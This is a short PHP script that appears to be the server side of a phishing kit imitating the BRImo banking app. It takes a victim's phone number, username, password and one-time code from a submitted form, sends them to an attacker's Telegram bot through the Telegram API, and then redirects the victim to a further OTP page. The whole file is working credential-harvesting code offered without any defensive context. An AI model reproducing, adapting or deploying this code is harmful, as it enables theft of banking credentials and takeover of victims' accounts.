<?php

session_start();
include "./tele.php";

$uname = $_POST['unames'];
$_SESSION['unames'] = $uname;
$pass = $_POST['pass'];
$_SESSION['pass'] = $pass;
$nomor = $_POST['nomor'];
$_SESSION['nomor'] = $nomor;
$otp = $_POST['otp'];
$_SESSION['otp'] = $otp;

$message = "
( BRIMO | RESULT )

- Nomor : ".$nomor."
- Username : ".$uname."
- Password : ".$pass."
- Otp : ".$otp."
";

function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../otp2.html');
?>